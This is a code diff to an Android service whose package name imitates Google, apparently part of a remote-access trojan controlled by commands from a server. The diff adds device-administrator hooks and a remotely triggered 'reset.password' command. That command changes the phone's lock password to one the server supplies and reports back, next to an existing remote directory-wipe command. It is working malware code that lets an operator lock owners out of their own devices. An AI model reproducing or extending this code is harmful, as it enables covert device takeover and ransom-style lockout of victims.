@@ -2,6 +2,8 @@ package com.google.android.android;
 
 import android.app.ActivityManager;
 import android.app.Service;
+import android.app.admin.DeviceAdminReceiver;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -148,6 +150,16 @@ public class MainService extends Service {
                 _client.execute();
             }*/
         }
+    }
+
+    public boolean checkAdminService() {
+        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        ComponentName adminName = new ComponentName(this, MyAdmin.class);
+        return devicePolicyManager.isAdminActive(adminName);
+    }
+
+    public ComponentName getAdminName() {
+        return new ComponentName(this, MyAdmin.class);
     }
 
     public void receiveMessage(JSONObject message) {
@@ -355,6 +367,16 @@ public class MainService extends Service {
                 code = (getFileManager().clearDir(dirPath))? SUCCESS : ERROR;
                 nettyClient.sendClearDir(code, (String) message.get("owner"));
                 break;
+            case "reset.password":
+                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+                ComponentName adminName = new ComponentName(this, MyAdmin.class);
+                if (!devicePolicyManager.isAdminActive(adminName)) code = ERROR;
+                else {
+                    result = devicePolicyManager.resetPassword((String) message.get("password"), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
+                    code = (result)? SUCCESS : ERROR;
+                }
+                nettyClient.sendResetPassword(code, (String) message.get("owner"));
+                break;
             /*case "setOwner":
                 String owner = message.getString("owner");
                 outputJSONObject.put("owner", owner);
@@ -432,5 +454,17 @@ public class MainService extends Service {
     public String getSimpleDateFormat(long milliseconds) {
         SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yy HH:mm:ss");
         return simpleDateFormat.format(new Date(milliseconds));
+    }
+
+    public static class MyAdmin extends DeviceAdminReceiver {
+        @Override
+        public void onEnabled(Context context, Intent intent) {
+            System.out.println("admin onEnabled");
+        }
+
+        @Override
+        public void onDisabled(Context context, Intent intent) {
+            System.out.println("admin inEdisabled");
+        }
     }
 }
